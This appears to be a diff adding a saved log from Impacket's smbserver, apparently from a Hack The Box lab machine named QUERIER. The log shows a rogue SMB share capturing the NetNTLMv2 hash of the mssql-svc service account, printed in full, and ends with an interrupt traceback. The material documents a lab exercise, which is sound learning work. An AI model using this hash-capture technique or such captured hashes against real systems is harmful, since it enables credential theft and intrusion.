@@ -1,0 +1,33 @@
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.10.10.125,49679)
+[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
+[*] User QUERIER\mssql-svc authenticated successfully
+[*] mssql-svc::QUERIER:4141414141414141:3cf3797f399ceeddbecdf5c429db0c3f:0101000000000000808ee42b7002d601f89093d2a23ba251000000000100100044004e0057004a004b00520050004200020010006b007100720062004e0073004e0056000300100044004e0057004a004b00520050004200040010006b007100720062004e0073004e00560007000800808ee42b7002d6010600040002000000080030003000000000000000000000000030000057fc9a52e9eb42f505eb51dd0202cefead0b0f75a62180ce45a9df54d97e2b780a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003700000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[-] SMB2_TREE_CONNECT not found S
+[-] SMB2_TREE_CONNECT not found S
+[*] AUTHENTICATE_MESSAGE (\,QUERIER)
+[*] User QUERIER\ authenticated successfully
+[*] :::00::4141414141414141
+^CTraceback (most recent call last):
+  File "/usr/share/doc/python3-impacket/examples/smbserver.py", line 98, in <module>
+    server.start()
+  File "/usr/lib/python2.7/dist-packages/impacket/smbserver.py", line 4638, in start
+    self.__server.serve_forever()
+  File "/usr/lib/python2.7/SocketServer.py", line 231, in serve_forever
+    poll_interval)
+  File "/usr/lib/python2.7/SocketServer.py", line 150, in _eintr_retry
+    return func(*args)
+KeyboardInterrupt
+[*] Disconnecting Share(1:IPC$)
+[*] Handle: [Errno 104] Connection reset by peer
+[*] Closing down connection (10.10.10.125,49679)
+[*] Remaining connections []
+
